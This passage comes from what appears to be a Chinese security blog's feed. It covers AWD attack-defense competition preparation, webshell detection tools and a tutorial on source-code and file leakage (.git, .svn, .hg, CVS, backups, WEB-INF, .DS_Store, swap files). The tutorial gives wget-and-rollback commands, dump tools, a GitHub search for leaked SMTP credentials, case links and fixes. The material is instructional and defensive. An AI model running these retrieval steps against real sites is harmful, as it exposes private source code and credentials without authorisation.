href="https://github.com/yemoli/prepare-for-awd">https://github.com/yemoli/prepare-for-awd</a></li><li><a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></li><li><a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></li><li>AoiAWD-针对CTF AWD的原创轻量级防御系统 <a href="https://mp.weixin.qq.com/s/kwzJnoi2FwFhwbdxetd45A">https://mp.weixin.qq.com/s/kwzJnoi2FwFhwbdxetd45A</a></li><li>AWD平台搭建 <a href="https://www.cnblogs.com/Triangle-security/p/11332223.html">https://www.cnblogs.com/Triangle-security/p/11332223.html</a></li><li>AWD红蓝对抗资料工具 <a href="https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ%E6%8F%90%E5%8F%96%E7%A0%81:xiao">https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ提取码:xiao</a></li><li>线下AWD平台搭建以及一些相关问题解决 <a href="https://www.cnblogs.com/pureqh/p/10869327.html">https://www.cnblogs.com/pureqh/p/10869327.html</a></li></ul><p><strong>案例2：防守-扫描后门-实现第一时间利用预留后门攻击-升级脚本版</strong></p><p>最快第一时间操作，此类技术核心在于扫描源码中预留或隐藏后门(源码语言)</p><p>10款常见的Webshell检测工具</p><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款Webshll检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种WebShell检测能力，比如阿里云、青藤云、safedog等，本文暂不讨论。</p><p>1、D盾_Web查杀</p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。</p><p>兼容性：只提供Windows版本。</p><p>工具下载地址：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p><p>2、百度WEBDIR+</p><p>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放API支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p><p>3、河马</p><p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持Windows、linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p><p>4、Web Shell Detector</p><p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。</p><p>兼容性：提供php&#x2F;python脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p>5、CloudWalker（牧云）</p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性，提供linux版本，Windows 暂不支持。</p><p>在线查杀demo：<a href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn/</a></p><p>github项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p>6、Sangfor WebShellKill</p><p>Sangfor WebShellKill(网站后门检测工具)是一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html%EF%BC%88%E5%B7%B2%E5%81%9C%E6%AD%A2%E8%AE%BF%E9%97%AE%EF%BC%89">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p>7、深度学习模型检测PHP Webshell</p><p>一个深度学习PHP webshell查杀引擎demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me/</a></p><p>8、PHP Malware Finder</p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供linux版本，Windows 暂不支持。</p><p>github项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p><p>9、findWebshell</p><p>这个项目是一款基于python开发的webshell检查工具，可以根据特征码匹配检查任意类型的webshell后门。</p><p>github项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>10、在线webshell查杀工具</p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><p>参考：<a href="https://www.cnblogs.com/xiaozi/p/12679777.html">https://www.cnblogs.com/xiaozi/p/12679777.html</a></p><p><strong>案例3：防守-代码审计-实现第一时间找出源码中安全漏洞-升级漏洞库版</strong></p><p>最快第一时间操作，简要分析可能存在的安全问题，配合流量监控及代码审计后续操作(框架及非框架，源码语言，漏洞库等)进行漏洞判定</p><p>推荐2款工具，尽快审计源码：Seay源代码审计系统、Fortify。</p><p><strong>案例4：防守-文件监控-实现第一时间监控当前目录文件操作-升级流量监控</strong></p><p>最快第一时间操作，在防守攻击时，实时监控当前目录文件上传删除等操作，有效防止恶意删除、上传后门等，后续可配合流量操作行为监控找出更多漏洞</p><p>图片</p><p><strong>案例5：攻击-批量Flag-实现第一时间利用脚本批量 Flag 得分-升级模版不死马</strong></p><p>攻击第一时间操作，写好批量获取 Flag 脚本后，预定 Flag 更新时间，实现自动获取及提交，升级后门写入及不死马等操作，实现权限维持实时获取得分</p><p>假设分析脚本，发现一个后门，针对这个后门，可以批量写脚本。</p><p>图片</p><p>批量获取并提交flag脚本：</p><p>图片</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;80-红蓝对抗-AWD模式&amp;amp;准备&amp;amp;攻防&amp;amp;监控&amp;amp;批量&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全（AWD红蓝对抗）" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/"/>
    
    
  </entry>
  
  <entry>
    <title>文件泄露</title>
    <link href="http://blog.hvvl404.fun/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    <id>http://blog.hvvl404.fun/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2023-05-17T10:08:14.108Z</published>
    <updated>2023-05-18T14:34:00.793Z</updated>
    
    <content type="html"><![CDATA[<p>信息泄露</p><span id="more"></span><p>文件泄露介绍</p><p>提到信息泄露大家应该都不陌生了，现在有太多的信息泄露，可能在某些人眼里这已经不算什么了。但是信息泄露确是很严重的问题，这可不只泄露你一个人的信息那么简单，可能表面上只泄露你一个人的信息，实际上你全家人的信息都被扒出来了，而且泄露的信息包括你的身份证、家庭住址等敏感信息。</p><p>但是接下来会介绍的不是关于人的敏感信息，而是网站的敏感信息，就是一些重要文件泄露、源码泄露等。</p><h2 id="一、版本管理软件造成的泄露"><a href="#一、版本管理软件造成的泄露" class="headerlink" title="一、版本管理软件造成的泄露"></a>一、版本管理软件造成的泄露</h2><h3 id="1、git-泄露"><a href="#1、git-泄露" class="headerlink" title="1、git 泄露"></a>1、git 泄露</h3><p>（1）漏洞产生</p><p>Git 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 .git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、所有该项目的源代码</span><br><span class="line">2、私有仓库的地址</span><br><span class="line">3、私密的配置信息</span><br><span class="line">4、所有commiter的邮箱帐号信息</span><br><span class="line">5、（可能）内部的帐号和密码</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>常规的利用方法就是下载整个目录, 然后用git命令回滚整个项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">2、cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：GitHack、dvcs-ripper、scrabble</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、GitHack</span><br><span class="line">github项目地址：https://github.com/lijiejie/GitHack</span><br><span class="line"></span><br><span class="line">2、dvcs-ripper：基于perl的工具，除了git还支持很多版本管理系统</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br><span class="line"></span><br><span class="line">3、scrabble</span><br><span class="line">github项目地址：</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、UC某业务导致敏感内部邮件信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091525</span><br><span class="line">2、高德软件多个信息泄露，影响公司安全：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094921</span><br><span class="line">3、陌陌某重要应用源码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086227</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、删除.git目录。</span><br><span class="line">2、修改中间件配置进行对.git隐藏文件夹的访问。</span><br></pre></td></tr></table></figure><h3 id="2、svn-源码泄露"><a href="#2、svn-源码泄露" class="headerlink" title="2、svn 源码泄露"></a>2、svn 源码泄露</h3><p>（1）漏洞产生</p><p>svn 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为 .svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用 “导出” 功能，而是直接复制代码文件夹到 WEB 服务器上，这就使 .svn 隐藏文件夹被暴露于外网环境，可以利用 <code>.svn/entries</code> 文件，获取到服务器源码。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）所有该项目的源代码</span><br><span class="line">（2）svn仓库的地址</span><br><span class="line">（3）svn仓库所属用户的用户名</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>同样是先下载目录, 然后回滚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">（2）cd www.example.com &amp;&amp; svn revert --recursive</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：Seay-SVN、dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper: 支持旧版和新版的svn</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br><span class="line"> </span><br><span class="line">（2）Seay-Svn: 法师的工具，基于Windows平台</span><br><span class="line">下载地址：https://www.vuln.cn/2225</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）淘宝网某应用svn信息导致代码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2012-012665</span><br><span class="line">（2）新浪某服务器svn源码泄露可SQL影响海量用户数据：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0199607</span><br><span class="line">（3）中国联通整站配置不当导致SVN源码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0169147</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）删除web目录中所有.svn隐藏文件夹。</span><br><span class="line">（2）开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。</span><br></pre></td></tr></table></figure><h3 id="3、hg-源码泄露"><a href="#3、hg-源码泄露" class="headerlink" title="3、hg 源码泄露"></a>3、hg 源码泄露</h3><p>（1）漏洞产生</p><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成 .hg 。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）项目源代码</span><br><span class="line">（2）项目仓库地址</span><br><span class="line">（3）（可能）仓库的用户名</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>手动利用，下载+回滚：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">（2）cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除.hg文件。</span><br></pre></td></tr></table></figure><h3 id="4、cvs-泄露"><a href="#4、cvs-泄露" class="headerlink" title="4、cvs 泄露"></a>4、cvs 泄露</h3><p>（1）漏洞产生</p><p>CVS 是一个 C&#x2F;S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS&#x2F;Root 以及 CVS&#x2F;Entries 目录，直接就可以看到泄露的信息。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为是纯客户端的工具，所以只会泄露源代码</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理。</span><br><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">（2）cd www.example.com &amp;&amp; cvs diff \*</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）华为某系统CVS信息泄漏：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-081481</span><br><span class="line">（2）国泰君安某重要分站CVS信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0136373</span><br><span class="line">（3）易宝支付某站多处CVS信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0109755</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除cvs文件。</span><br></pre></td></tr></table></figure><h3 id="5、Bazaar-x2F-bzr泄露"><a href="#5、Bazaar-x2F-bzr泄露" class="headerlink" title="5、Bazaar&#x2F;bzr泄露"></a>5、Bazaar&#x2F;bzr泄露</h3><p>（1）漏洞产生</p><p>bzr也是个版本控制工具，虽然不是很热门，但它也是多平台支持，并且有不错的图形界面，bzr在初始化项目时(bzr init&#x2F;init-repo)，会在项目根目录产生名为.bzr的隐藏目录，同样暴露了源代码和用户信息。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）源代码</span><br><span class="line">（2）仓库地址</span><br><span class="line">（3）开发者的信息</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>没用过bzr工具, 不过查询文档得知可用bzr revert命令来进行回滚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">（2）cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同git。</span><br></pre></td></tr></table></figure><h3 id="6、github-源码泄漏"><a href="#6、github-源码泄漏" class="headerlink" title="6、github 源码泄漏"></a>6、github 源码泄漏</h3><p>（1）漏洞产生</p><p>GitHub 是一个面向开源及私有软件项目的托管平台。很多人喜欢把自己的代码上传到平台托管，通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。类似的代码托管平台还有很多，人才是最大的漏洞。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+&lt;span&gt;@qq.com&lt;/span&gt;&amp;type=code</span><br></pre></td></tr></table></figure><p>（3）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）咕咚网github信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0177720</span><br><span class="line">（2）一个github引发的畅捷通渗透测试：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0164337</span><br><span class="line">（3）Github Hack之环球运费网代码泄露（审计发现安全漏洞）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0152208</span><br></pre></td></tr></table></figure><h3 id="7、前端泄露"><a href="#7、前端泄露" class="headerlink" title="7、前端泄露"></a>7、前端泄露</h3><p>源代码泄露，在 ctf 中常见于签到题，一般叫你右键查看源代码就可以看到 flag 了，有时候他不让你右键，那么就按 F12 来查看，那万一 F12 也不让呢？那就在地址前加一个 <code>view-source:</code> 即可，或者是 <code>ctrl+s</code> 保存网页的前端代码到本地以文本形式打开查看。</p><p>（1）漏洞产生</p><p>由于程序员的失误导致在前端的注释没有删除，会显示在页面上。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、右键源代码查看</span><br><span class="line">2、F12 查看</span><br><span class="line">3、地址前加 view-source:</span><br><span class="line">4、ctrl+s 文本打开查看</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>删除注释。</p><br><h2 id="二、文件包含导致的泄露"><a href="#二、文件包含导致的泄露" class="headerlink" title="二、文件包含导致的泄露"></a>二、文件包含导致的泄露</h2><h3 id="1、网站备份压缩文件"><a href="#1、网站备份压缩文件" class="headerlink" title="1、网站备份压缩文件"></a>1、网站备份压缩文件</h3><p>（1）漏洞产生</p><p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似 tar -czvf bakup.tgz 的命令将网站进行备份, 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,  如 vim 的 .swp , 从而泄露了该网页的源代码。</p><p>（2）漏洞利用</p><p>对于打包文件而言，渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站，说不定会有意外惊喜。对于网页的临时备份文件，可以扫描对应页面的 .swp 或者 .bak 等后缀，说不定也能找到有用的信息。</p><p>（3）漏洞工具：御剑、dirsearch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）dirsearch</span><br><span class="line">github项目地址：https://github.com/maurosoria/dirsearch</span><br><span class="line"></span><br><span class="line">（2）御剑</span><br><span class="line">下载地址：https://pan.baidu.com/share/init?surl=Bn7GtWb7AStcjzVahFOjSQ?passwd=zkaq</span><br></pre></td></tr></table></figure><p>（4）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）广州医科大学某分站备份文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0225610</span><br><span class="line">（2）起点中文网某分站备份文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0170753</span><br><span class="line">（3）奥凯航空任意用户登陆/敏感信息泄露/内部文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0158981</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><p>做好版本管理，并利用版本管理工具过滤掉这些类型的文件，同时不要直接在生产环境中修改或者添加文件。</p><p>（6）常见的压缩文件及备份文件后缀名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">压缩文件：</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar.gz</span><br><span class="line"></span><br><span class="line">备份文件后缀名：</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.swp</span><br><span class="line">.swo</span><br><span class="line">.~</span><br><span class="line">.bak</span><br><span class="line">.bash_history</span><br><span class="line">.bkf</span><br></pre></td></tr></table></figure><h3 id="2、WEB-INF-x2F-web-xml-泄露"><a href="#2、WEB-INF-x2F-web-xml-泄露" class="headerlink" title="2、WEB-INF&#x2F;web.xml 泄露"></a>2、WEB-INF&#x2F;web.xml 泄露</h3><p>（2）漏洞产生</p><p>&lt;1&gt; 在 Java 的 Servlet 文档中，说到 WEB-INF 目录“包含了所有 web 应用会用到但是不处于 web 路径中的资源”，也就是说，WEB-INF 目录下的内容是不属于公开页面的。web 应用可以通过 getResource 等 API 在 servlet 的上下文中访问到这些资源。</p><p>&lt;2&gt; 通常开发者会把许多 JSP 文件，Jar 包，Java 的类文件放在该目录下。一般目录的内容都是可以预测的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">2、WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">3、WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">4、WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">5、WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><p>（2）漏洞利用</p><p>通过 web.xml 文件推测应用组件相关类的名字，然后在 src 目录下查找代码，如果没有源代码可以直接下载 class 文件反编译即可。</p><p>（3）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）傲世堂官网WEB-INF目录文件导致信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-029022</span><br><span class="line">（2）华为官网WEB-INF目录配置文件导致信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-022906</span><br><span class="line">（3）某政府网站WEB-INF目录读取到Getshell：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-068399</span><br></pre></td></tr></table></figure><p>（4）漏洞修复</p><p>发布前确认WEB-INF目录是禁止访问的, 或者在server设置好对于的过滤规则。</p><h3 id="3、DS-Store-文件泄露"><a href="#3、DS-Store-文件泄露" class="headerlink" title="3、DS_Store 文件泄露"></a>3、DS_Store 文件泄露</h3><p>（1）漏洞产生</p><p>.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将 .DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p>（2）漏洞利用</p><p>.DS_Store 的格式为二进制，内部数据结构为Proprietary格式，可以自行解析并递归下载所有文件，参考 lijiejie 的 ds_store_exp 。</p><p>（3）漏洞利用工具：ds_store_exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）ds_store_exp</span><br><span class="line">github项目地址：https://github.com/lijiejie/ds_store_exp</span><br></pre></td></tr></table></figure><p>（4）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）西北大学SQL注入+DS_Store信息泄露+git信息泄露+HP打印机未授权访问：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0167033</span><br><span class="line">（2）Camera360多各分站服务器配置不当导致未授权访问（DS_Store泄密）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095996</span><br><span class="line">（3）TCL某网站DS_Store文件泄露敏感信息（谨慎使用Mac系统）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091869</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><p>使用 macOS 开发的同学，可以把 .DS_Store 加入忽略列表中(如 .gitignore )，但本质上其只是泄露目录结构，就算删掉 .DS_Store ，文件也依然存在于 web 服务器可以访问得到的地方，所以治本的方法还是不要将敏感信息放在 web 路径中。</p><h3 id="4、Vim-文件泄露"><a href="#4、Vim-文件泄露" class="headerlink" title="4、Vim 文件泄露"></a>4、Vim 文件泄露</h3><p>（1）漏洞产生</p><p>swp 即 swap 文件，在用 vim 编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果第一次意外退出就会保留，文件名为 .filename.swp；第二次意外退出就会生成文件名为 .filename.swo 的文件。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接访问 .swp 文件，下载回来后删掉末尾的.swp，获得源码文件。</span><br><span class="line"></span><br><span class="line">2、直接访问 .swo 文件，下载回来后删掉末尾的.swo，获得源码文件。</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>删除 .swp 或者是 .swo 文件。</p><br><h2 id="三、配置文件的泄露"><a href="#三、配置文件的泄露" class="headerlink" title="三、配置文件的泄露"></a>三、配置文件的泄露</h2><h3 id="1、配置文件泄露"><a href="#1、配置文件泄露" class="headerlink" title="1、配置文件泄露"></a>1、配置文件泄露</h3><p>（1）漏洞产生</p><p>现代WEB开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。</p><p>（2）漏洞利用</p><p>通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好常见的配置文件路径，如 wordpress 的 <code>/wp-config.php</code> 等，组织成字典然后用脚本进行批量测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 